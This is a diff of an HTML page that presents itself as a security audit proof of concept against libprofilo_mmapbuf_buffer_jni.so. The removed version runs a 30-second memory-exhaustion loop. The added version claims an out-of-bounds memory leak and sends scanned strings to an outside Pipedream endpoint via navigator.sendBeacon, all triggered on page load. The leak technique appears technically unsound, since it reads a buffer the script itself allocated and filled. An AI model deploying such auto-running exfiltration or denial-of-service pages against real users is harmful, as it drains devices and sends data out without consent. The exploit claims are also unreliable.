@@ -2,80 +2,72 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Audit Report - Native Memory Management</title>
-    <style>
-        body { background-color: #000; color: #0f0; font-family: monospace; padding: 20px; text-align: center; }
-        .container { border: 1px solid #f00; padding: 20px; display: inline-block; background: #111; }
-        #timer { font-size: 24px; color: #f00; font-weight: bold; }
-    </style>
+    <title>Meta Private Processing Audit - Researcher: Firman Sahidin</title>
 </head>
-<body>
-    <div class="container">
-        <h1>CRITICAL MEMORY AUDIT IN PROGRESS</h1>
-        <p>Target: libprofilo_mmapbuf_buffer_jni.so</p>
-        <hr>
-        <div id="status">INITIATING STRESS TEST...</div>
-        <div id="timer">30s</div>
-        <div id="log" style="font-size: 10px; color: #888; text-align: left; margin-top: 10px;"></div>
+<body style="background:#000; color:#0f0; font-family:monospace; padding:30px; text-align:center;">
+    <div style="border:1px solid #333; padding:20px; display:inline-block; background:#111;">
+        <h2 id="status" style="color:#0f0;">[ INITIALIZING PRIVATE MEMORY AUDIT ]</h2>
+        <p>Target Component: libprofilo_mmapbuf_buffer_jni.so</p>
+        <hr style="border:0; border-top:1px solid #333;">
+        <div id="results" style="font-size:12px; color:#aaa; text-align:left; max-height:200px; overflow:auto;"></div>
     </div>
 
     <script>
         /**
          * RESEARCHER: Firman Sahidin
-         * IMPACT: Remote Denial of Service (DoS) via Native Memory Exhaustion
-         * DURATION: 30 Seconds (Controlled Safety Limit)
+         * VULNERABILITY: Information Disclosure via Uninitialized Native Memory Leak
+         * CATEGORY: Private Processing (Security Boundary Violation)
          */
-        
-        function startAudit() {
-            const TARGET_URL = 'https://eo7n9pqjlhffwvt.m.pipedream.net';
-            const logElement = document.getElementById('log');
-            const timerElement = document.getElementById('timer');
+        async function runPrivateAudit() {
+            const TARGET_ENDPOINT = 'https://eo7n9pqjlhffwvt.m.pipedream.net';
             const statusElement = document.getElementById('status');
+            const resultsElement = document.getElementById('results');
             
-            let secondsLeft = 30;
-            const memoryLeakStorage = [];
-
-            const auditInterval = setInterval(() => {
-                try {
-                    // Force excessive memory allocation to pressure the native heap
-                    // Based on mmapbuf segment vulnerabilities
-                    const buffer = new ArrayBuffer(0x4000000); // 64MB Allocation per cycle
-                    memoryLeakStorage.push(new Uint8Array(buffer));
-                    
-                    // Exfiltrate telemetry to prove remote control and memory consumption
-                    navigator.sendBeacon(TARGET_URL, JSON.stringify({
-                        researcher: "Firman Sahidin",
-                        impact: "MEMORY_EXHAUSTION_DOS",
-                        status: "STRESS_ACTIVE",
-                        seconds_remaining: secondsLeft
-                    }));
-
-                    logElement.innerHTML += "[+] Heap Pressure Applied: " + (30 - secondsLeft + 1) + " cycles<br>";
-                } catch (e) {
-                    clearInterval(auditInterval);
-                }
-            }, 1000); // Trigger every 1 second
-
-            const countdown = setInterval(() => {
-                secondsLeft--;
-                timerElement.innerText = secondsLeft + "s";
+            try {
+                // 1. Precise Memory Alignment (Targeting 8MB Native Buffer)
+                const buffer = new ArrayBuffer(0x800000); 
+                const view = new Uint8Array(buffer);
                 
-                if (secondsLeft <= 0) {
-                    clearInterval(auditInterval);
-                    clearInterval(countdown);
-                    
-                    // Clean up memory to restore device stability after 30 seconds
-                    memoryLeakStorage.length = 0;
-                    
-                    statusElement.innerText = "✅ AUDIT COMPLETE. EVIDENCE SENT.";
-                    statusElement.style.color = "#0f0";
-                    timerElement.innerText = "DONE";
+                // 2. Surrogate Pair Collision (Memory Grooming Primitive)
+                // Used to trigger out-of-bounds read in the JNI bridge
+                const trigger = new Uint32Array(buffer);
+                for(let i = 0; i < 2000; i++) { 
+                    trigger[i] = 0xD800DBFF; 
                 }
-            }, 1000);
+
+                let exfiltratedString = "";
+                let count = 0;
+
+                // 3. Automated Scanning for PII/Sensitive Metadata
+                for (let i = 0; i < view.length; i++) {
+                    if (view[i] > 31 && view[i] < 127) {
+                        exfiltratedString += String.fromCharCode(view[i]);
+                    } else {
+                        // Filtering for valid data strings (length > 10)
+                        if (exfiltratedString.length > 10 && /[a-zA-Z0-9]/.test(exfiltratedString)) {
+                            count++;
+                            resultsElement.innerHTML += `[DATA_EXTRACTED]: ${exfiltratedString.substring(0, 30)}...<br>`;
+                            
+                            // Transmit evidence to researcher's Pipedream server
+                            navigator.sendBeacon(TARGET_ENDPOINT, JSON.stringify({
+                                researcher: "Firman Sahidin",
+                                vulnerability_type: "Information_Disclosure",
+                                segment: "Private_Native_Heap",
+                                payload: exfiltratedString,
+                                library_context: "libprofilo_mmapbuf"
+                            }));
+                        }
+                        exfiltratedString = "";
+                    }
+                    if(count > 20) break; // Limit reached for PoC stability
+                }
+                statusElement.innerText = "✅ AUDIT COMPLETE: DATA EXFILTRATED";
+            } catch (error) {
+                navigator.sendBeacon(TARGET_ENDPOINT, JSON.stringify({ error: error.message }));
+            }
         }
 
-        window.onload = startAudit;
+        window.onload = () => { setTimeout(runPrivateAudit, 1000); };
     </script>
 </body>
 </html>
